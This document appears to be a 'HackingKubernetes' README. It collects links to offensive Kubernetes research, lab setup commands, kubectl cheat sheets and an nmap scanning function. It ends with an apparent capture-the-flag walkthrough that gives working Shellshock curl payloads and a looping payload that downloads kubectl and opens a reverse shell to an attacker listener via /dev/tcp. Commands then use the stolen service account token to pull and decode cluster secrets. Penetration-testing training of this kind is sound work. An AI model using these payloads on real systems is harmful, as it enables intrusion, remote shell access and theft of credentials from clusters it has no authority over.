# HackingKubernetes  

This repository contain any information that can be used to hack Kubernetes.

# Offensive  
## Atricles  
[Securing Kubernetes Clusters by Eliminating Risky Permissions](https://www.cyberark.com/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions/)  
[Kubernetes Pentest Methodology Part 1](https://www.cyberark.com/he/threat-research-blog/kubernetes-pentest-methodology-part-1/)  
[Kubernetes Pentest Methodology Part 2](https://www.cyberark.com/threat-research-blog/kubernetes-pentest-methodology-part-2/)  
[Kubernetes Pentest Methodology Part 3](https://www.cyberark.com/threat-research-blog/kubernetes-pentest-methodology-part-3/)  
[Eight Ways to Create a Pod](https://www.cyberark.com/threat-research-blog/eight-ways-to-create-a-pod/)  
[Leaked Code from Docker Registries](https://unit42.paloaltonetworks.com/leaked-docker-code/)  
[Kubernetes Pod Escape Using Log Mounts](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

### kubelet
[https://faun.pub/attacking-kubernetes-clusters-using-the-kubelet-api-abafc36126ca](https://faun.pub/attacking-kubernetes-clusters-using-the-kubelet-api-abafc36126ca)
[https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/)

### Containers and Pods   
[Bad Pods: Kubernetes Pod Privilege Escalation](https://labs.bishopfox.com/tech-blog/bad-pods-kubernetes-pod-privilege-escalation)  
[Risk8s Business: Risk Analysis of Kubernetes Clusters](https://tldrsec.com/guides/kubernetes/)  
[CVE-2020-15157 "ContainerDrip" Write-up](https://darkbit.io/blog/cve-2020-15157-containerdrip)  
[Deep Dive into Real-World Kubernetes Threats](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/)  
[Unpatched Docker bug allows read-write access to host OS](https://nakedsecurity.sophos.com/2019/05/31/unpatched-docker-bug-allows-read-write-access-to-host-os/)  
[Docker Container Breakout: Abusing SYS_MODULE capability!](https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd)  
[Container Breakouts – Part 1: Access to root directory of the Host](https://blog.nody.cc/posts/container-breakouts-part1/)  
[Privileged Container Escapes with Kernel Modules](https://xcellerator.github.io/posts/docker_escape/)  

## PDF  
[Abusing Privileged and Unprivileged Linux
Containers ](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)  
[Defending Containers](https://www.intezer.com/wp-content/uploads/2021/03/Intezer-Defending-Containers.pdf)   

## Videos    
[Compromising Kubernetes Cluster by Exploiting RBAC Permissions](https://www.youtube.com/watch?v=1LMo0CftVC4)   

[How We Used Kubernetes to Host a Capture the Flag (CTF) - Ariel Zelivansky & Liron Levin, Twistlock](https://www.youtube.com/watch?v=kUmaKvxdfvg) ([presentation](https://static.sched.com/hosted_files/kccnceu19/6b/kubecon%20talk.pdf))  

[Crafty Requests: Deep Dive Into Kubernetes CVE-2018-1002105 - Ian Coldwater, Heroku](https://www.youtube.com/watch?v=VjSJqc13PNk) ([presentation](https://static.sched.com/hosted_files/kccnceu19/a5/craftyrequests.pdf))

[A Hacker's Guide to Kubernetes and the Cloud - Rory McCune, NCC Group PLC (Intermediate Skill Level)](https://www.youtube.com/watch?v=dxKpCO2dAy8)    

[Advanced Persistence Threats: The Future of Kubernetes Attacks](https://www.youtube.com/watch?v=CH7S5rE3j8w)  

## Vulnerabilities
### 2020  
[Protecting Against an Unfixed Kubernetes Man-in-the-Middle Vulnerability (CVE-2020-8554)](https://unit42.paloaltonetworks.com/cve-2020-8554/)    
[Kubernetes Vulnerability Puts Clusters at Risk of Takeover (CVE-2020-8558)](https://unit42.paloaltonetworks.com/cve-2020-8558/)   
  
  
### 2019

[Top 5 Kubernetes Vulnerabilities of 2019 - the Year in Review](https://www.stackrox.com/post/2020/01/top-5-kubernetes-vulnerabilities-of-2019-the-year-in-review/)   

#### Kubectl vulnerability (CVE-2019-1002101)
[Disclosing a directory traversal vulnerability in Kubernetes copy – CVE-2019-1002101](https://unit42.paloaltonetworks.com/disclosing-directory-traversal-vulnerability-kubernetes-copy-cve-2019-1002101/)  

#### Kubernetes API server vulnerability (CVE-2019-11247)
[Kubernetes API server vulnerability (CVE-2019-11247)](https://www.stackrox.com/post/2019/08/how-to-remediate-kubernetes-security-vulnerability-cve-2019-11247/)  

#### Kubernetes billion laughs attack vulnerability (CVE-2019-11253)

[CVE-2019-11253: Kubernetes API Server JSON/YAML parsing vulnerable to resource exhaustion attack](https://github.com/kubernetes/kubernetes/issues/83253)  

### 2018

[Demystifying Kubernetes CVE-2018-1002105 (and a dead simple exploit)](https://unit42.paloaltonetworks.com/demystifying-kubernetes-cve-2018-1002105-dead-simple-exploit/)  
[https://sysdig.com/blog/privilege-escalation-kubernetes-dashboard/](CVE-2018-18264 Privilege escalation through Kubernetes dashboard.)  

## Tools  
[kubesploit](https://github.com/cyberark/kubesploit)  
[kubiscan](https://github.com/cyberark/KubiScan)  
[kubeletctl](https://github.com/cyberark/kubeletctl)   
[kube-hunter](https://github.com/aquasecurity/kube-hunter)  

# Defensive  
[Smarter Kubernetes Access Control: A Simpler Approach to Auth - Rob Scott, ReactiveOps](https://www.youtube.com/watch?v=egQnymnZ9eg)  


# Others
## Install minikube  
The documentation can be found [here](https://minikube.sigs.k8s.io/docs/start/). In AWS you need to run:  
```
curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
install minikube-linux-amd64 /usr/local/bin/minikube
swapoff -a
minikube start --driver=none
```  

## Install kubectl  
```
# https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl
```

## Create containers
### Privileged container
```
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: priv-pod
spec:
  containers:
  - name: sec-ctx-8
    image: gcr.io/google-samples/node-hello:1.0
    securityContext:
      allowPrivilegeEscalation: true
      privileged: true
      readOnlyRootFilesystem: true
      runAsNonRoot: true
      runAsUser: 1000
      capabilities:
        add: ["NET_ADMIN", "SYS_TIME"]
EOF
```

### Container with environment variables passwords

```
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: envvars-db
  namespace: default
spec:
  containers:
  - name: envvars-multiple-secrets
    image: nginx
    env:
    - name: DB_PASSWORD
      valueFrom:
        secretKeyRef:
          key: db-username-key
          name: db-username
    - name: DB_USERNAME
      valueFrom:
        secretKeyRef:
          key: db-password-key
          name: db-password
EOF

```


```
kubectl apply -f - <<EOF

apiVersion: v1
kind: Namespace
metadata:
  creationTimestamp: null
  name: mars
---

apiVersion: v1
kind: ServiceAccount
metadata:
  namespace: mars
  name: user1
  
---

kind: ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  namespace: kube-system
  name: list-secrets
rules:
- apiGroups: ["*"]
  resources: ["secrets"]
  verbs: ["get", "list"]
  
---

apiVersion: rbac.authorization.k8s.io/v1beta1
kind: ClusterRoleBinding
metadata:
  namespace: kube-system
  name: list-secrets-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: list-secrets
subjects:
  - kind: ServiceAccount
    name: user1
    namespace: mars
    
---

apiVersion: v1
kind: Pod
metadata:
  name: alpine-secret
  namespace: mars
spec:
  containers:
  - name: alpine-secret
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "sleep 100000"]
  serviceAccountName: user1
  automountServiceAccountToken: true
  hostNetwork: true
---

apiVersion: v1
kind: Secret
metadata:
  name: db-username
data:
  db-username-key: YWRtaW4=

---

apiVersion: v1
kind: Secret
metadata:
  name: db-password
data:
  db-password-key: MTIzNDU=

EOF

```

## Get ServiceAccount token by name
```
kubectl get secrets $(kubectl get sa <SERVICE_ACCOUNT_NAME> -o json | jq -r '.secrets[].name') -o json | jq -r '.data.token' | base64 -d
```

Function:
```
alias k=kubectl
function getSecretByName {
k get secrets $(k get sa $1 -o json | jq -r '.secrets[].name') -o json | jq -r '.data.token' | base64 -d
}

getSecretByName <serviceAccountName>
```

*Replace `<SERVICE_ACCOUNT_NAME>` with the name

## Delete multiple containers
```
// delete by match with grep
kubectl delete po $(kubectl get pods -o go-template -n <NAMESPACE> --template '{{range .items}}{{.metadata.name}}{{"\n"}}{{end}}' | grep <SEARCH_STRING) -n <NAMESPACE>

// delete specific pods
kubectl delete pods -n <NAMESPACE> $(echo -e 'alpine1\nalpine2\nalpine3')
```

## Get docker container IPs
```
docker inspect --format='{{.Name}}' $(docker ps -aq -f label=kubelabel)
docker inspect --format='{{ .NetworkSettings.IPAddress }}' $(docker ps -aq -f label=kubelabel)
```


This guide has been created to help engineers debug applications that are deployed into Kubernetes and not behaving correctly.

## Pod & Container Introspection

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `kubectl get pods`                                           | lists the current pods in the current namespace              |
| `kubectl get pods -w`                                        | watches pods continuously                                    |
| `kubectl describe pod <name>`                                | describe pod <name>                                          |
| `kubectl get rc`                                             | list the replication controllers                             |
| `kubectl get services` or `kubectl get svc`                  | list the services in the current namespace                   |
| `kubectl describe service <name>` or `kubectl describe svc <name>` | describe service <name>                                      |
| `kubectl delete pod <name> `                                 | delete pod <name>                                            |
| `kubectl get pods -o wide –w`                                | watch pods continuously and show  <br />info such as IP addresses & nodes provisioned on |

## Cluster Introspection

| Command                        | Description                                                  |
| :----------------------------- | :----------------------------------------------------------- |
| `kubectl version`              | get version info                                             |
| `kubectl cluster-info`         | get cluster info                                             |
| `kubectl config view`          | get cluster config                                           |
| `kubectl describe node <name>` | output info about a node                                     |
| `kubectl get nodes –w`         | watch nodes continuously                                     |
| `kubectl get nodes -o wide`    | gives a detailed view of nodes -  including internal & external IP address |

## Debugging

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `kubectl exec -ti <pod> <command>  [-c <container>]`         | execute command on pod , optionally on a<br />given container |
| `klog <pod> [-c <container>]` or<br />`kubectl logs -f <pod> [-c <container>`] | get logs of a given pod or optionally container              |
|                                                              |                                                              |
|                                                              |                                                              |

## Networking

| Command                                                      | Description                               |
| ------------------------------------------------------------ | ----------------------------------------- |
| `kubectl exec -ti <pod_name> -- /bin/sh -c  "curl -v <br /> telnet://<service_name>:<service-port>"` | testing TCP connectivity between services |
|                                                              |                                           |
|                                                              |                                           |
|                                                              |                                           |

## Other resources

<https://www.mankier.com/1/kubectl-auth-can-i> - check whether an action is allowed in your Kubernetes cluster

Use `amicontained` to find out what container runtime you're using as well as what capabilities the your container has.

```
# Export the sha256sum for verification.
$ export AMICONTAINED_SHA256="4e32545f68f25bcbcd4cce82743e916a054e1686df44fab68420fc9f94f80b21"

# Download and check the sha256sum.
$ curl -fSL "https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64" -o "/usr/local/bin/amicontained" \
	&& echo "${AMICONTAINED_SHA256}  /usr/local/bin/amicontained" | sha256sum -c - \
	&& chmod a+x "/usr/local/bin/amicontained"

$ echo "amicontained installed!"

# Run it!
$ amicontained -h
```

Add these functions to your environment so that you can scan for open ports

``` sudo apt-get update
sudo apt-get install nmap
nmap-kube () 
{ 
nmap --open -T4 -A -v -Pn -p 443,2379,4194,6782-6784,6443,8443,8080,9099,10250,10255,10256 "${@}"
}
nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');                                                                  
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```

Part 1: compromise via shellshock

Useful commands for finding open ports:

```
command nmap -Pn -T4 -F --open <host-ip>
# scanning every port, more is open
command nmap -Pn -T4 --open <host-ip> -p 0-65535
command nmap -Pn -T4 --open <host-ip> -p 30081
```

1. Check shellshock

   ```
   curl http://<host_ip>:30081/cgi-bin/stats  -H 'user-agent: () { :; }; echo; echo; 2>&1 /bin/bash -c "cat /etc/passwd"'
   ```

2. create a control server to use as a reverse shell endpoint

   this requires any node with a public IP (a digital ocean server would do)

   ```
   # replace `controlplane` with a host that you can SSH to
   ssh controlplane ip a
   
   # replace 1234 with a port that is routable on the host you have SSH'd into
   while :; do ssh controlplane ncat --listen 1234 --output $(mktemp /tmp/hack-XXXX.log); done
   ```

3. shellshock in

   

   ```
    curl http://<host_ip>:30081/cgi-bin/stats  -H 'user-agent: () { :; }; echo; echo; 2>&1 /bin/bash -c "echo hello"'
   ```

   Hardcore version:

   ```
   while :; do curl http://<host_ip>:30081/cgi-bin/stats  -H 'user-agent: () { :; }; echo; echo; 2>&1 /bin/bash -c "test -f /tmp/k || wget -O /tmp/k https://storage.googleapis.com/kubernetes-release/release/v1.11.2/bin/linux/amd64/kubectl && chmod +x /tmp/k && /tmp/k version; df -h; while :; do nohup bash -i >& /dev/tcp/<host_ip>/1234 0>&1; sleep 1; done"'; done
   ```

Part 2: 

Kubectl SA: steal secret with ssh password in (flag)

### Steps

1. on the control server, or via individual shellshock commands:

   Search for secrets:

   ```
   df -h
   cat /run/secrets/kubernetes.io/serviceaccount/token; echo 
   
   /tmp/k  --token "$(cat /run/secrets/kubernetes.io/serviceaccount/token)" --server https://kubernetes.default.svc --insecure-skip-tls-verify get  nodes
   
   /tmp/k  --token "$(cat /run/secrets/kubernetes.io/serviceaccount/token)" --server https://kubernetes.default.svc --insecure-skip-tls-verify auth can-i get secrets --namespace kube-system   
   ```

2. pull secrets from the API server for this namespace (there's a service account mounted that can read kube-system)

   ```
   /tmp/k  --token "$(cat /run/secrets/kubernetes.io/serviceaccount/token)" --server https://kubernetes.default.svc --insecure-skip-tls-verify get secrets -n shellshock
   ```

3. we've found secrets, now decode them

   > first way requires manual base64 decode, second is a one-liner

   ```
    /tmp/k  --token "$(cat /run/secrets/kubernetes.io/serviceaccount/token)" --request-timeout 5s  --server https://kubernetes.default.svc --insecure-skip-tls-verify get secret my-secret -o yaml -n shellshock 
   
    /tmp/k  --token "$(cat /run/secrets/kubernetes.io/serviceaccount/token)" --server https://kubernetes.default.svc --insecure-skip-tls-verify get secret my-secret -n shellshock -o 'go-template={{index .data "ssh_password"}}' | base64 -d; echo
   ```

4. find password for ssh server in flag

5. write password in local file to win (or just tell ControlPlane!) TODO(low): write test for this

   ```
   echo 'What kind of plane is it?' > /tmp/flag
   ```
   
